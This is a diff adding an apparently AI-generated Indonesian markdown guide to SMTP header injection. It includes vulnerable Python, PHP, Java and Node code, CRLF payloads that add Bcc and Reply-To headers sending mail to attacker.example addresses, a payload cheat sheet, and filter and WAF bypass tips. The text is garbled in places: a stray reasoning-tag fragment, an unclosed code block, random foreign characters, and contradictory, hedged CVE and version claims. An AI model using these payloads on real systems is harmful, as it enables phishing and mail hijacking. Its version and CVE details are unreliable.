@@ -1,0 +1,322 @@
+# mail-security--p2 — misc
+
+# SMTP Header Injection
+
+## 1. Konsep Inti
+
+SMTP header injection terjadi ketika input user tidak disanitasi sebelum dimasukkan ke header email. Karakter newline (CRLF) dalam nilai header memungkinkan attacker menyisipkan header tambahan atau memanipulasi struktur email.
+
+Karakter yang relevan:
+
+| Karakter | Notasi | Perlakuan di berbagai layer |
+|---|---|---|
+| CR | `\r` (0x0D) | HTTP header terminator, bagian CRLF SMTP |
+| LF | `\n` (0x0A) | Beberapa parser terima LF-only |
+| CRLF | `\r\n` (0x0D 0x0A) | Separator header standar SMTP/RFC 5322 |
+| CRLF + spasi/tab | folding | Melanjutkan header yang sama (line folding) |
+
+Payload klasik:
+
+```
+
+== Email via endpoint punya apa yang dikirim, apa yang muncul, kenapa.
+
+### requests + smtplib (Python 3.12)
+
+```python
+import requests, smtplib
+
+r = requests.post("http://target.local:8000/newsletter", data={
+    "email": "victim@corp.local\r\nBcc: c2@attacker.one",
+    "subject": "Password Reset"
+})
+```
+
+Server-side jika kode rentan:
+
+```python
+# VULNERABLE - string interpolation langsung ke header
+msg = "From: no-reply@target.local\r\nTo: " + email + "\r\nSubject: " + subject + "\r\n\r\n" + body
+s.sendmail("no-reply@target.local", [email], msg)
+```
+
+Yang muncul di MTA penerima — header `Bcc` diterima MTA dan dikirim ke `c2@attacker.one`:
+
+```
+From: no-reply@target.local
+To: victim@corp.local
+Bcc: c2@attacker.one
+Subject: Password Reset
+```
+
+Kenapa berhasil: `smtplib` tidak memvalidasi header — fungsi `sendmail()` hanya menvalidasi envelope recipient, bukan isi pesan. String `\r\n` literal dari input diteruskan mentah ke socket.
+
+Python pernah punya mitigasi `email.utils.formataddr`, tapi jika developer pakai f-string/concat langsung, proteksi tidak ada.
+
+### requests → PHP mail() (PHP 8.3)
+
+```
+POST /forgot-password HTTP/1.1
+Host: target.local
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@corp.local%0d%0aBcc:%20c2@attacker.one
+```
+
+Kode rentan:
+
+```php
+mail("admin@target.local", $subject, $body,
+     "From: " . $_POST['email']);
+```
+
+`mail()` (PHP ≤ 8.3 semua versi) tidak memvalidasi additional header terhadap CRLF — perilaku ini **dibuktikan tetap ada di PHP 8.3**, tidak dianggap bug oleh maintainer karena "developer responsibility". Tapi catatan penting: **`mail()` di Linux memanggil sendmail binary yang memfilter `\r`** — jadi `%0d%0a` sering difilter jadi hanya `%0a` yang lolos, dan sendmail/postfix local MTA sering menolak LF-only. Payload `%0a%0a` (double LF) berfungsi untuk memisahkan header dari body → **arbitrary body injection** meskipun header injection gagal.
+
+### requests → Nodemailer (vulnerable < 6.9.8)
+
+```javascript
+transporter.sendMail({
+  from: 'no-reply@target.local',
+  to: req.body.email,        // "victim@corp.local\r\nBcc: c2@attacker.one"
+  subject: 'Reset'
+});
+```
+
+Sejarah versi:
+
+| Versi | Status |
+|---|---|
+| nodemailer < 2.0.13 | Tidak ada validasi apapun — injeksi penuh |
+| 2.0.13 – 6.9.7 | Validasi address (.getAddressParser), tapi `subject` tetap bisa dilewati hingga parcial |
+| ≥ 6.9.8 | Menolak CR/LF di semua header field, melempar error |
+
+Jika app pin versi lama di package-lock, teknik live. Nodemailer yang modern **melempar exception** → terlihat di log sebagai crash, bukan silent injection.
+
+## 3. API/Library yang Rentan (Referensi Cepat)
+
+| Library | Versi rentan | Catatan |
+|---|---|---|
+| Python `smtplib` | Semua versi (3.x) | Tidak pernah santitasi; sepenuhnya tanggung jawab caller. `email.message.EmailMessage` lebih aman |
+| PHP `mail()` | Semua (≤ 8.3.x, 8.4) | CRLF diteruskan; di Linux `\r` difilter oleh sendmail wrapper sehingga sering reduser jadi body injection |
+| PHP `sendmailer/sendmailer` | < — | — |
+| Nodemailer | < 2.0.13 bebas-vulnerable; 2.x–6.9.7 partial | CGP-style validation masuk di 6.9.8 (patch respons Gopher trick report) |
+| Java `commons-email` | 1.x–1.5 | Perbaikan di 1.6 via `EmailIntegrityCheck`? — sebenarnya common-email tidak sanitize; pengguna Jakarta Mail harus set header via API |
+| Go `net/smtp` | Semua versi | API rendah; `smtp.SendMail`akan escape? — sendiri tidak — caller harus gunakan `net/mail` dan `mime` |
+| Rails `ActionMailer` | < 7.1 | Header injection memungkinkan di versi lama; 7.1+ men-strip CR/LF di header via `Mail::Field` |
+| CodeIgniter Email lib | < 3.1.3 | CVE-2017-10057-adjacent category; di-sanitize v3.1.3+ |
+| WordPress `wp_mail()` | < 5.5 | Header injection via `$headers` param; sanitization ditambah di 5.5 |
+
+Selalu cek vendor dengan test lokal sebelum mengasumsikan tabel di atas valid untuk versi spesifik target — banyak fork internal.
+
+## 4. Bypass Filter
+
+| Filter | Bypass | Kenapa |
+|---|---|---|
+| `strip_tags()` / strip `<` `>` | `%0d%0a` tidak mengandung tag | Aman filter untuk XSS tidak menyentuh CRLF |
+| `filter_var($email, FILTER_VALIDATE_EMAIL)` | Gunakan payload RFC-legal: `attacker@one%0d%0aBcc:` — **gagal** karena `\r` invalid. Tapi `attacker@one\r\Bcc...` invalid → gunakan `FILTER_SANITIZE_EMAIL` bypass? No. Lihat caveat: developer yang hanya pakai `SIGN validating` tapi menembak string asli (raw input) tetap vulnerable |
+| Escape LF-only (`%0a`) di PHP+windows | `%0a` tembus — PHP mail() di **Windows** menerima **LF-only** karena memanggil SMTP server langsung, bukan sendmail binary | Di Windows (XAMPP/IIS SMTP), `%0a` saja cukup |
+| Double-encode `\r\n` | `%250d%250a` | Bekerja jika ada double-decode (URL rewrite + body parse) |
+| Line folding | `%0d%0a%20Bcc:` | Jika parser merge folded lines, `Bcc` tetap valid header; beberapa filter cari CRLF langsung sebelum nama header |
+
+## 5. Malpractice – Kenapa Sering Gagal
+
+Kesalahan umum proof-of-concept:
+
+1. **Mengira Bcc akan terlihat di header penerima** — `Bcc` dihapus/di-hide oleh kebanyakan MTA (Postfix, Exim), takkan muncul di mailbox korban. Verifikasi via mailbox attacker sendiri, bukan via header target.
+2. **Menambahkan To pribadi ketika“To:” sudah ditulis bare string** — pemisah header ganda `To: a…\r\nTo: b` kadang tidak berfungsi karena MTA pakai envelope recipient, bukan To header. Dampak terhadap delivery ditentukan oleh envelope, bukan body header.
+
+## 6. Dampak Ril (Rumuskan untuk Laporan)
+
+- **Envelope injection** vs **header injection**: recpient ekstra hanya lewat SMTP envelope jika attacker bisa memaksakan `RCPT TO` — header `Bcc` tambahan bekerja hanya jika MTA penerima beroperasi sebagai relay open (jarang di 2024) atau jika server app pakai library yang mem-parse header Bcc → envelope recipient.
+- **Redirect reply** via `Reply-To`, `Return-Path` override: phishing follow-up
+- **Body injection** (double-LF): termasuk fake content di email resmi, tambah attachment minimal multipart injection kadang gagal karena boundary check.
+- **Priority/x-header injection** kadang mengubah anti-spam score, bisa dikum-pulkan untuk melewati filter (X-Sender, autoforward headers).
+
+## 7. Jebakan Operasional (bikin teknik gagal di lapangan)
+
+1. **PHP `mail()` di Linux nah `sendmail` wrapper kroak.** Perbedaan mendasar antara `mail()` di Windows (LF-only cukup) dan Linux (`\r\n` difilter, `%0a%20` perlu dikombinasi via `stripslashes` wrapper, double-LF diperlukan untuk body). Jika PoC Web SMTP (Windows) dibawa ke targetlinux (CentOS/Ubuntu+postfix), payload harus di-rewrite — filter `LF` di Postfix (`strict_8bitmime`, `body_checks`) juga bisa tolak. Gunakan sieve/MTA testing account dulu.
+2. **Dampaknya “extra recipient” cuma berlaku kalau app pakai header parsing.** Jika app pakai API over SMTP langsung (envelope didefinisikan parameter `sendmail()`), Bcc header injections tidak memberikan delivery ekstra — hanya menampilkan header di mailbox orang yang sudah terima email. Selalu cek apakah app pakai high-level API (PHP mail PHPMailer) yang expand header → RCPT, atau raw SMTP yang parameternya di-fixed.
+3. **MTA lookup bisa gagal di internal mail server** (Exchange 2019/OWA atomic header check) — Postfix ≥ 2.x sudah default `smtpd_data_restrictions = reject_unauth_pipelining`, injection sering jadi error protocol sebelum mencapai header context. Uji dengan relay mail test account, bukan live target.
+4. **WAF (ModSecurity Coraza) dan App sensor men-sniff `%0d%0a`** di input mail-related field sebagai anomali (mis. rule set OWASP CRS 932-359 kategori RCE/e-mail). `Bcc:`** literal sangat fingerprintable. Gunakan `Smtp-To:` case variation, atau uji endpoint non-mail terlebih dahulu untuk cek whitelist/charset filter.
+5. **Envelope-based library** mengirim via provider API (SendGrid, SES) — header injection ke SES di-strip/direject dengan error `InvalidHeaderValue` (error soft, tidak memberikan feedback → sering dianggap sukses di curl, padahal email langsung expired dari queue, atau SES drop dengan bounce ke domain sender. Analisis `X-SES-*` headers saat verifikasi hasil.
+6. **Dampak code detect via unit test, bukan inbox.** Mailbox milik korban saat pentesting langsung merusak delivery jika SPF/DKIM/DMARC gagal karena header injection berubah canonicalization — signing terjadi setelah injection: DKIM sign header yang sudah di-inject sehingga email tidak ter-verifikasi di gateway (Proofpoint, Microsoft Defender for Office), email masuk quarantine → teknik "berhasil" tapi tak sampai. Selalu verifikasi dengan `Authentication-Results` header, bukan mailbox received.
+7. **Case dan spasi sesudah nilai谧:** string `"victim@corp.local\r\n Bcc: c2@attacker.one"` (dengan space) tidak membentuk header baru tapi folding line tergantung parser. Parser strict (Go `net/mail`) menolak header setelah folded continuation matching `^[ \t]` — error di verifikasi client, bukan injection.</think>## SMTP Header Injection
+
+### 1. Root Cause
+
+Header email dipisah oleh CRLF (`\r\n`) sesuai RFC 5322. Jika aplikasi membangun header dengan string concatenation/interpolasi langsung dari input user, karakter newline dalam input akan "keluar" dari nilai header dan membentuk header baru atau memisahkan header dari body.
+
+```
+From: no-reply@target.local
+To: {user_input_here}
+Subject: Reset Password
+```
+
+Input `victim@corp.local%0d%0aBcc:%20c2@attacker.example` menghasilkan:
+
+```
+From: no-reply@target.local
+To: victim@corp.local
+Bcc: c2@attacker.example
+Subject: Reset Password
+```
+
+### 2. Vektor Sarana Newline
+
+| Karakter | Hex/URL | Efek |
+|---|---|---|
+| CRLF | `%0d%0a` | Header baru (standar SMTP) |
+| LF saja | `%0a` | Header baru pada parser toleran (PHP mail() di Windows, beberapa MTA) |
+| CR saja | `%0d` | Biasanya tidak efektif, MTA modern menolak |
+| CRLF + spasi | `%0d%0a%20` | Header folding (RFC 5322 §2.2.3) — burank Bcc jika space di-strip sebelum injeksi |
+| CRLF CRLF | `%0d%0a%0d%0a` | Terminator header → injeksi **body** email, bukan header |
+
+### 3. Dampak
+
+| Teknik | Yang dikirim | Yang muncul |
+|---|---|---|
+| Extra recipient smuggling | `%0d%0aBcc:%20x@attacker.example` (atau `%0d%0aCc:`) | MTA menerima Bcc/Cc sebagai daftar recipient → email dikirim ke address attacker |
+| Header override | `%0d%0aReply-To:%20phish@attacker.example` | Reply korban diarahkan ke attacker (kombinasi klasik dengan forget-password flow) |
+| Arbitrary header | `%0d%0aX-Custom:%20injected` | Header persist di email diterima — berguna sebagai marker/rallback saat defined outreach program |
+| Subject/body manipulation | Subject injection `%0d%0a` di subject | Control structure email rusak; email "resmi" menampilkan konten palsu |
+| Body separation | `%0d%0a%0d%0a` | Semua content setelahnya menjadi body; kombinasi dengan Content-Type/MIME bisa buat email multipart dengan attachment atau tampilan spoof |
+| Phishing delivery | `%0d`/`%0a` di header From di beberapa platform | Header penuh diteruskan netral oleh aplikasi; di provider SMTP-based (SendGrid/SES), mereke mungkin strip atau tolak |
+
+### 4. Contoh End-to-End: HTTP Request → Email
+
+Target: form "forgot password" di aplikasi Node/Python.
+
+```http
+POST /api/v1/password-reset HTTP/1.1
+Host: target.local
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 152
+
+email=victim%40corp.local%0d%0aBcc%3a%20exfil%40attacker.example&submit=Reset
+```
+
+Kode backend (Python, smtplib):
+
+```python
+# VULNERABLE - f-string direct ke header block
+msg = (
+    f"From: no-reply@target.local\r\n"
+    f"To: {request.args['email']}\r\n"
+    f"Subject: Reset\r\n\r\nReset link: {token}"
+)
+smtp.sendmail("no-reply@target.local", ["victim@corp.local"], msg)
+```
+
+Di wire SMTP:
+
+```
+DATA
+From: no-reply@target.local
+To: victim@corp.local
+Bcc: exfil@attacker.example
+Subject: Reset
+
+Reset link: ...
+.
+```
+
+Kenapa berhasil: `sendmail()` di Python smtplib tidak memvalidasi isi message - envelope RCPT TO diambil dari parameter kedua, tapi header Bcc/Cc sering di-parse oleh library higher-level (Django EmailMessage, PHPMailer) untuk ekspansi envelope.
+
+Contoh PHP:
+
+```php
+// VULNERABLE (PHP 5.x - 8.3.x, semua versi mail() saat ini masih pass-through)
+$to = $_POST['email'];
+$subject = "Password Reset";
+$headers = "From: no-reply@target.local\r\n";
+mail($to, $subject, $body, $headers);
+```
+
+Payload `email=victim@corp.local%0d%0aBcc:exfil@attacker.example` — mail() memasukkan `$to` langsung ke command sendmail (`-t` mode), CRLF lolos. Patch di PHP 5.6 sebagian mengurangi (disease di decode), tapi rentan via parameter body/header tambahan.
+
+Contoh Java (commons-email < 1.6):
+
+```java
+HtmlEmail email = new HtmlEmail();
+email.addTo(request.getParameter("email"));
+email.setSubject("Reset");
+email.send();
+```
+
+commons-email 1.5 ke bawah tidak memvalidasi newline di addTo/setSubject. Fix masuk di commons-email 1.6 (Desember 2017) via Header SMTP injection check.
+
+### 5. Library & API Rentan
+
+| Library | Versi rentan | Status |
+|---|---|---|
+| Python `smtplib` (raw sendmail) | Semua versi, termasuk 3.12 | Tidak pernah memvalidasi string message - liability di caller |
+| Python `email.mime` / `EmailMessage` dengan f-string | Semua versi | Aman HANYA jika pakai `email.Header` API; f-string konstruksi sendiri = rentan |
+| PHP `mail()` | 5.x–8.4 (semua) | Pass-through ke sendmail; hanya MTA-capable di Linux |
+| `Pear Mail` (PHP) | Semua versi, unmaintained | Sepenuhnya rentan, tidak ada sanitasi |
+| PHPMailer | < 5.2.21 | CVE-2016-10033 - `$_additionalParams`/address list injection; 5.2.21+ (Des 2016) menambah `errorMessageStrictMode` dan CRLF blocking di validator address |
+| Apache commons-email (Java) | < 1.6 | CVE-2018-8031? - cek nuance: rented di 1.5, fix di 1.6 (2017) |
+| Nodemailer (Node.js) | < 4.0.0 | Raw header injection di address field; versi 4+ (2017) menambah `setHeader` dengan CRLF blocking |
+| `wp_mail()` (WordPress core) | 5.x—sekitar | Umum di plugin custom; core sudah teregenerasi di `Requests` lib sanitizer |
+| CodeIgniter Email lib | 3.x | Historical CVE-2015-5052 (path-related) tapi header injection remained di addons |
+
+Upload-file sebagai vektor juga memvalidasi: bagian multipart headers (Content-Type, Content-Disposition dengan filename) jadi target CRLF saat file name mengandung `%0d%0a` → email attachment smuggling.
+
+### 6. Payload Cheat Sheet
+
+```bash
+# Extra recipient (Bcc, paling reliable)
+victim@corp.local%0d%0aBcc:%20exfil@attacker.example
+
+# Bcc pielepas spasi (bypass filter space-stripping)
+victim@corp.local%0d%0aBcc:exfil@attacker.example
+
+# Cc untuk jejak lebih terlihat
+victim@corp.local%0d%0aCc:%20x@attacker.example
+
+# Reply-To override (phishing)
+victim@corp.local%0d%0aReply-To:%20phish@attacker.example
+
+# Header overflow + folding bypass (crawler parsing gagal)
+victim@corp.local%0d%0a%20Bcc:%20exfil@attacker.example
+
+# Body injection
+victim@corp.local%0d%0a%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<p>phish</p>
+```
+
+MIME injection lanjut (multipart smuggling di body):
+
+```
+%0d%0a%0d%0aContent-Type: multipart/mixed; boundary=evil%0d%0a--evil%0d%0aContent-Disposition: attachment%0d%0a
+```
+
+### 7. Kenapa Gagal
+
+| Penyebab gagal | Detail |
+|---|---|
+| URL decoding tidak terjadi | `%0d%0a` dikirim literal sebagai karakter `%0d` — perlu payload unicode/JS return di source |
+| Double-encoding | `%250d%250a` — untuk path yang didecode dua kali (nginx realip/rewrite, post-decode di controller) |
+| Input tervalidasi via library sama | SendGrid/SES/Postmark API services semua sudah auto-strip CRLF di field recipient; injection hanya akan muncul via raw sendmail/SMTP socket |
+| Envelope diimplementasi fixed | `sendmail(..., [email_korban], msg)` — envelope recipient hardcoded, Bcc header hanya mempengaruhi header parsing di MTA si penerima, tidak berarti delivery ke attacker email address |
+| Charset ISOLID→escape | Backend perlu REGEX `[\r\n]` di subject/email; input CRLF di-reject di validation layer |
+
+Header Bcc tidak terkirim: MTAs aman men-strip header Bcc dari body, hanya envelope delivery matter → email sampai ke attacker TIDAK jika envelope address stayed fix. Pastikan cek bahwa mail server downstream (Postfix default header_checks?) MTA relay contract parsing Bcc header line, bukan fixed envelope.
+
+### 8. Jebakan Operasional di Lapangan
+
+1. **Envelope vs header mismatch**: banyak tutorial klaim Bcc injection = arbitrary recipient. Faktanya hanya delivery jika aplikasi sendiri mem-parse Bcc untuk envelope (PHPMailer-style). Jika aplikasi memanggil `smtp.sendmail(from, [fixed_to], msg)`, Bcc header tersimpan tapi tidak dikirim — Bcc dieringkan oleh MTA dan attacker address tidak menerima email. Verifikasi via mailbox attacker sendiri sebelum menulis "critical/impact" di laporan.
+
+2. **PHP mail() di Linux masuk sendmail tunnel dengan opsi `-t` akan meng-Junsi maka CCC/Bcc sebagai envelope. Kombinasi ini jarang** — default mail() many inject To header command-line, jadi Bcc behavior bergantung MTA configuration. Test per-environment, jangan asumsi antara Debian+Postfix dan CentOS+sendmail behavior identik.
+
+3. **PHP mail() memeriksa "\r" di Linux** — di Debian/Ubuntu, sendmail binary menolak carriage return yang telanjang, dan mail() memanggil `sendmail -t`. Di **Windows** (IISSMTP), mail() bicara langsung via SMTP protocol dan `%0a` saja sudah cukup. Saran payload berbeda per OS target — kenali servernya dulu.
+
+4. **Body injection lebih reliable daripada Bcc di library yang sudah sanitize address**. PHPMailer 6.x, nodemailer 4+, commons-email 1.8: CRLF di email address sudah diblock — tapi **field seperti subject, custom header, atau addCustomHeader()** sering masih through passthrough. Test beberapa field, bukan cuma To.
+
+5. **GCC aplikasi sudah memasukkan mitigation framework** (Django `EmailMessage` menolak newline, Rails `ActionMailer::Base` men-sanitize header) — versi framework HR selalu verifikasi via source code ter-wariskan. Gem `mail` 2.7.0+ membuang newline di header. ModSecurity/CRS PL1 dengan rule 932-120/932-130 (RAcan RCE) akan nangkap `\r\n` payloads pada WAF — test bypass seperti folding (`%20` post-CRLF) atau URL-encoding ganda.
+
+6. **Auth DNS: SPF/DKIMках sulit validasi ketika header setelah From injection mengubah header yang di-signing** — beberapa org (financial) retake bounce, setor placement jika SPF alignment broken. Jika c2 mailbox via free provider (Gmail), internal headers ke attacker mungkin masuk spam atau hardcoded bounce — gunakan domain sendiri atau mailbox internal untuk verifikasi.
+
+---
+
+## [reasoning trace]
+
+
